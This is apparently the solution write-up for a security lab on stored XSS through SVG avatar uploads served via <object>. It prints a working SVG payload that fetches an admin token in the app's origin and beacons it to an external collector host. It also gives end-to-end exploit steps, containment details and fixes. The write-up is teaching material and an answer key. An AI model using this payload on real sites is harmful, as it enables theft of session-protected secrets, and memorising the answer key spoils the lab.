# Solution — Stored XSS via SVG Avatar Upload

## Classification

**CWE-79 / OWASP A03:2021 – Injection.** A user-supplied SVG is stored without
sanitisation and later served as an executable `image/svg+xml` **document**,
so its script runs in the application's origin in a victim's browser.

## The sink

`POST /avatar` accepts the upload if two cosmetic checks pass:

```python
if f.mimetype != "image/svg+xml": ...        # client-declared part Content-Type
if not raw.lstrip()[:4].lower() == b"<svg": ...  # a magic-prefix sniff
_avatars[uid] = raw                           # stored verbatim — no sanitisation
```

Neither check inspects the SVG _body_, so `<script>` and `on*` handlers survive.
The bytes are then served back as a real document:

```python
@app.get("/avatars/<uuid>.svg")
def avatar_serve(uuid):
    return Response(raw, mimetype="image/svg+xml")   # a DOCUMENT, scripts run
```

and embedded on the profile with `<object>`:

```html
<object data="/avatars/<uuid>.svg" type="image/svg+xml" width="200" height="200"></object>
```

## Why `<img>` is safe but `<object>` / `<iframe>` / direct navigation are not

An SVG file is markup that _can_ carry `<script>`, `onload`, `<a href="javascript:…">`,
`<foreignObject>` HTML, etc. Whether that markup executes depends entirely on
**how the browser loads it**:

- **`<img src="x.svg">`** (and CSS `background`, `<image>` in another SVG) load
  the file as an **image resource**. The browser rasterises it in a restricted
  mode — scripts and external/interactive content are **not** run. This is the
  safe way to show an untrusted SVG.
- **`<object>`, `<iframe>`, `<embed>`, and navigating straight to
  `/avatars/x.svg`** load it as a **document**. A document has a DOM, a
  JavaScript context, and — crucially — **an origin**. Loaded from the same
  origin as the app, the SVG's `<script>` runs _as the app_, with the app's
  cookies and same-origin privileges.

This profile page chose `<object type="image/svg+xml">`, so the avatar becomes a
same-origin script host. That is the entire vulnerability: not "the SVG was
displayed" but "the SVG was **executed as a document in our origin**."

## The delivery model

You can't call `/admin/token` — it 403s without the admin cookie, and you can't
mint that cookie (`/internal/bot-login` is backend-firewalled and `BOT_KEY`-gated).
You need the **admin's** browser. `POST /report` queues a same-site path that the
admin bot visits every ~2s while logged in. Report your `/u/<uuid>` profile and
the bot loads it, running your SVG.

## The payload

```html
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch('/admin/token')
      .then((r) => r.text())
      .then((t) => {
        new Image().src = 'http://collector:9000/report?t=' + encodeURIComponent(t);
      });
  </script>
</svg>
```

Two things make this work:

1. **Same-origin `fetch`.** The SVG document is served from `app:8080`, so
   `fetch('/admin/token')` is a same-origin request and the browser attaches the
   admin `session` cookie **automatically**. Note this defeats `HttpOnly`: the
   payload never touches `document.cookie` — it lets the browser send the cookie
   and just reads the endpoint's _response_. (`SameSite=Lax` also doesn't help;
   the request is same-site.)
2. **`new Image().src=…` beacon.** An image load fires a cross-origin GET to the
   collector with no CORS read barrier to worry about — the request going out is
   all we need.

## End-to-end

```
POST /avatar   (multipart: field "avatar", filename x.svg, Content-Type image/svg+xml,
                body = the SVG above)                         → {"uuid":"…","profile":"/u/…"}
POST /report   {"url":"/u/<uuid>"}
# wait for the bot to visit (~2s + settle)
GET  /oob/received        # app-side proxy to the collector; find /report?t=<32 hex>
POST /solve    {"c":"<32 hex>"}                               → FLAG{…}
```

`tests/exploit.py` automates this: it asserts `/admin/token` is 403 for an
unauthenticated request, uploads the SVG, reports the profile, polls
`/oob/received` for the 32-hex token, and redeems it at `/solve`.

## Why the containment holds

- The collector and admin bot share a `backend` network with `internal: true` —
  **no route off the host**. A stolen token reaches the in-lab collector but
  never the internet.
- `/internal/bot-login` (cookie minting) and `/internal/queue` are firewalled to
  the backend subnet **and** `bot-login` needs `BOT_KEY`, so a public visitor
  cannot skip the XSS by requesting the admin cookie or draining the queue.

## The fixes (defence in depth — any one breaks the exploit)

1. **Never serve user SVG as an executable document.** Return uploaded SVGs with
   a non-rendering type — `Content-Type: text/plain` (or
   `application/octet-stream`) with `Content-Disposition: attachment` and
   `X-Content-Type-Options: nosniff` — or transcode/proxy them to a raster format
   (PNG) server-side. Displaying via `<img src>` instead of `<object>` removes
   the script context for the same file.
2. **Sanitise the markup.** If SVG must render inline, run it through an
   allow-list sanitiser (e.g. DOMPurify with the SVG profile, or a server-side
   equivalent) that strips `<script>`, `on*` handlers, `<foreignObject>`, and
   `javascript:` URLs. A `<svg` magic-prefix sniff is **not** validation.
3. **Isolate the origin.** Serve user content from a separate, cookieless origin
   (e.g. `usercontent.example`) so even an executed SVG has no app cookies to
   fetch with.
4. **Content-Security-Policy.** `Content-Security-Policy: script-src 'none'` (or
   a strict nonce policy) on the served SVG / profile document stops inline
   `<script>` from running at all.
5. **`HttpOnly` on the session cookie** is good hygiene but, alone, does **not**
   fix this: the same-origin `fetch('/admin/token')` sends the cookie regardless.

## Re-platform note (catalog stack → Flask)

The catalog frames this pattern on a **Rails + ActiveStorage** avatar pipeline
(`content_type: "image/svg+xml"` blobs served through a Rails route and embedded
in an ERB view). Per the project's Flask-default Hybrid policy this lab is
re-platformed to **Flask 3.1 / gunicorn**, with the avatar store as an in-process
dict instead of ActiveStorage blobs. The lesson is framework-independent: it
lives entirely in the response `Content-Type` (`image/svg+xml`) and the embed
element (`<object>` document vs. `<img>` image). Rails, Django, Express or Flask
that serve an unsanitised user SVG as a same-origin document reach the identical
outcome; the fixes above apply verbatim.
